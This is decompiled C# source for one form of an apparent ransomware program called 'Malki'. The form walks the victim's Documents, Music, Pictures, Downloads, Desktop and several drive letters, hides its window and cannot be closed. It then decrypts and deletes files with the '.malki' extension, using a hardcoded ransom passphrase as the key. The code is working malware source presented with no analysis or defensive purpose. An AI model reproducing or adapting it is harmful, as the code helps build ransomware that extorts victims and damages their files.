using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ransomawaro.My;

namespace ransomawaro;

[DesignerGenerated]
public class Form3 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar2 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form3()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form3_FormClosing));
		((Form)this).add_Load((EventHandler)Form3_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form3));
		ListBox1 = new ListBox();
		ProgressBar2 = new ProgressBar();
		ProgressBar1 = new ProgressBar();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		ListBox1.set_BackColor(Color.Black);
		ListBox1.set_BorderStyle((BorderStyle)0);
		ListBox1.set_ForeColor(Color.Red);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(348, 119);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(201, 91);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(1);
		ProgressBar progressBar = ProgressBar2;
		location = new Point(348, 216);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar2 = ProgressBar2;
		size = new Size(201, 33);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(3);
		((Control)ProgressBar1).set_BackColor(Color.Black);
		ProgressBar progressBar3 = ProgressBar1;
		location = new Point(348, 78);
		((Control)progressBar3).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar4 = ProgressBar1;
		size = new Size(201, 35);
		((Control)progressBar4).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(4);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(364, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(9);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(409, 9);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(10);
		Label2.set_Text("Label2");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(454, 9);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(11);
		Label3.set_Text("Label3");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(499, 9);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(39, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(12);
		Label4.set_Text("Label4");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(551, 319);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form3");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form3_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		Process.Start("C:\\Windows\\explorer.exe");
		((Control)this).Hide();
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)2, new string[0]))
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
				{
					if (!file.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file);
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				if (!file2.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)2, new string[0]))
			{
				foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory2))
				{
					if (!file3.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file3);
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic()))
			{
				if (!file4.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)2, new string[0]))
			{
				foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory3))
				{
					if (!file5.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file5);
					}
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures()))
			{
				if (!file6.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)2, new string[0]))
			{
				foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory4))
				{
					if (!file7.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file7);
					}
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads"))
			{
				if (!file8.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)2, new string[0]))
			{
				foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory5))
				{
					if (!file9.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file9);
					}
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop"))
			{
				if (!file10.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory6))
				{
					if (!file11.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file11);
					}
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\"))
			{
				if (!file12.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory7))
				{
					if (!file13.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file13);
					}
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("E:\\"))
			{
				if (!file14.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file14);
				}
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory8))
				{
					if (!file15.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file15);
					}
				}
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("A:\\"))
			{
				if (!file16.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file16);
				}
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory9))
				{
					if (!file17.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file17);
					}
				}
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("Z:\\"))
			{
				if (!file18.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file18);
				}
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory10))
				{
					if (!file19.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file19);
					}
				}
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("X:\\"))
			{
				if (!file20.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file20);
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		ProgressBar2.set_Value(25);
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Interaction.MsgBox((object)"Malki is so happy! Now All Of Your Files Are Decrypted!", (MsgBoxStyle)64, (object)"AslaHora");
			Application.ExitThread();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		string text = Conversions.ToString(ListBox1.get_SelectedItem());
		ProgressBar2.set_Value(50);
		try
		{
			byte[] bytKey = MyProject.Forms.Form1.CreateKey("PAY TO MALKI $1000000");
			byte[] bytIV = MyProject.Forms.Form1.CreateIV("PAY TO MALKI $1000000");
			string strOutputFile = Strings.Replace(text, ".malki", "", 1, -1, (CompareMethod)0);
			MyProject.Forms.Form1.EncryptOrDecryptFile(text, strOutputFile, bytKey, bytIV, Form1.CryptoAction.ActionDecrypt);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar2.set_Value(0);
		ProgressBar1.Increment(1);
	}
}
